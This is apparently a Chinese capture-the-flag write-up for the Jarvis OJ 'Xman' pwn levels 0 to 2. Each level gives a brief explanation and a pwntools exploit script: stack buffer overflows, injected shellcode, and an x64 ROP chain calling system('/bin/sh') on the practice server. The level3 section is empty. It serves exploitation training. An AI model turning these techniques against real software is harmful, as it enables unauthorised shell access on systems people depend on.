---
title: Xman_Pwn
---
### level0 
简单栈溢出    
```.py
from pwn import *

#x=process("./level0")
x=remote("pwn2.jarvisoj.com",9881)

payload=0x80*"a"+8*"a"
payload+=p64(0x0000000000400596)

x.send(payload)
x.interactive()
```
### level1
简单栈溢出，需要自己构造shellcode，pwntools里面有shellcraft可自动生成shellcode，返回地址填充为buf地址。
```.py
from pwn import *

#x=process("./level1")
x=remote("pwn2.jarvisoj.com",9877)

x.recvuntil(":")
jmpaddr=x.recvuntil("?")[:-1]
jmpaddr=int(jmpaddr,16)
print jmpaddr

shellcode=asm(shellcraft.sh())
print shellcode

payload=shellcode
payload+=(0x88+4-len(shellcode))*"a"
payload+=p32(jmpaddr)

x.send(payload)
x.interactive()
```
### level2(x64)
简单x64栈溢出，和level0类似，但是x64的传参顺序是rdi,rsi,rdx,rcx,r8,r9。所以返回地址覆盖成pop rdi。
```.py
from pwn import *                                                
                                                                 
s=remote("pwn2.jarvisoj.com",9882)                               
                                                                 
x=ELF("./level2_x64")                                            
sysaddr=x.plt["system"]                                          
print sysaddr                                                    
shaddr=x.search('/bin/sh').next()                                
print shaddr                                                     
                                                                 
popridaddr=0x00000000004006B3                                    
payload=(0x80+8)*"a"+p64(popridaddr)+p64(shaddr)+p64(sysaddr)    
                                                                 
s.send(payload)                                                  
s.interactive()         
```                                         
### level2
栈溢出    
```.py
from pwn import *

s=remote("pwn2.jarvisoj.com",9878)

x=ELF("./level2")
sysaddr=x.symbols["system"]
shaddr=x.search('/bin/sh').next()

payload=(0x88+4)*"a"+p32(sysaddr)+p32(11)+p32(shaddr)

s.send(payload)
s.interactive()
```
### level3 

